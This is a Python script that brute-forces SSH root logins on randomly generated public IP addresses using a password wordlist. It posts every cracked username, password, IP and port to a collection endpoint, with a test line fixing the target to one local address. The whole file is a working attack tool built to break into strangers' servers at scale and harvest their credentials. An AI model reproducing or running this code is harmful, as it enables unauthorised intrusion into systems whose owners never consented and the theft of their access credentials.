#!/usr/bin/python3.6
#-*-coding:utf-8-*-

import random
import requests
from pexpect import pxssh
from threading import Thread

URL   = 'http://127.0.0.1:8000/api/add/' # Requests
FILE  = 'top120ssh.txt' # Requests
Fail  = False
Found = False
Words = [i for i in range(10)]

def randomTarget():

    l = []
    for i in range(4):
        if i != 3:
            l.append(str(random.randint(0, 255)))
        else:
            l.append(str(random.randint(1, 255)))
    return '.'.join(l)

def sshCr4cker(i, P, U='root', p=22):

    global Fail
    s = pxssh.pxssh()
    try:
        s.login(i, U, P, port=p)
        print("[SUCCESS] {0}/{1}@{2}:{3}".format(U, P, i, p))
        s.logout()
        return U, P, i, p
    except Exception as e:
        print("[FAIL] Exception: {0}".format(e))
        if 'read_nonblocking' in str(e):
            Fail = True
        elif 'could not set shell prompt' in str(e):
            Fail = True
        return None

def main():

    while True:

        Fail = False
        U = 'root'
        F = open(FILE, 'r')
        i = randomTarget()
        if i.startswith('192.168.') or i.startswith('127.') or i.startswith('10.') or i.startswith('0.'):
            continue
        i = '192.168.28.128' # ForTest
        print("[TARGET] {0}".format(i))
        p = 22
        for x in F.readlines():
            if Fail:
                break
            x = x.rstrip('\r').rstrip('\n')
            print("[TEST] Password {0}".format(x))
            cr4ck = sshCr4cker(i, x, U=U, p=p)
            if cr4ck:
                U, P, i, p = cr4ck
                try:
                    r = requests.post(URL, data={"U":U, "P":P, "i":i, "p":p})
                    print(r.text)
                except Exception as e:
                    # TODO//SAVE DATA
                    print("[POST] Exception: {0}".format(e))
                finally:
                    break
        F.close()

if __name__ == '__main__':
    main()